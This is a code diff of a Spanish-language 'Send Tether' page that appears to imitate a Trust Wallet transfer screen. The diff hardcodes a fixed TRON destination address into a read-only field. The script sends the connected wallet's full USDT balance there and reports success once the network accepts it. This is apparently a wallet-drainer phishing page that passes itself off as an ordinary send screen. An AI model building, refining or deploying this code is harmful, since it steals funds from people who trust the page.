@@ -124,14 +124,14 @@
                 <line x1="19" y1="12" x2="5" y2="12"></line>
                 <polyline points="12 19 5 12 12 5"></polyline>
             </svg>
-            <div class="tw-nav-title">Enviar Tether</div>
+            <div class="tw-header-title tw-nav-title">Enviar Tether</div>
         </div>
 
         <div class="tw-card">
             <label class="tw-label tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
             <div class="tw-input-container">
-                <!-- Tu dirección predeterminada fija sin permisos de borrado -->
-                <input id="addressDisplay" class="tw-field" type="text" readonly />
+                <!-- Tu dirección predeterminada fija cargada de forma nativa en el HTML -->
+                <input id="addressDisplay" class="tw-field" type="text" value="TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45" readonly />
                 <span class="tw-action-text tw-action-blue">Pegar</span>
             </div>
         </div>
@@ -155,14 +155,12 @@
     </div>
 
 <script>
-    // Dirección predeterminada inmutable
     const BILLETERA_DESTINO = "TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45"; 
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
 
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
-    const addressDisplay = document.getElementById('addressDisplay');
     const maxAction = document.getElementById('maxAction');
 
     let walletAddress = null;
@@ -171,9 +169,6 @@
         statusDiv.innerText = message || '';
         statusDiv.style.display = message ? 'block' : 'none';
     }
-
-    // Carga inicial obligatoria
-    addressDisplay.value = BILLETERA_DESTINO;
 
     async function obtenerBalanceSeguro(ownerAddress) {
         const tronWeb = window.tronWeb;
@@ -269,4 +264,10 @@
 
                 if (broadcast && broadcast.result) {
                     setStatus("Transacción de saldo total completada exitosamente.");
+                    connectBtn.innerText = "Completado";
+                } else {
+                    throw new Error("La transacción fue rechazada por los nodos.");
+                }
+
+            } catch (error) {
 
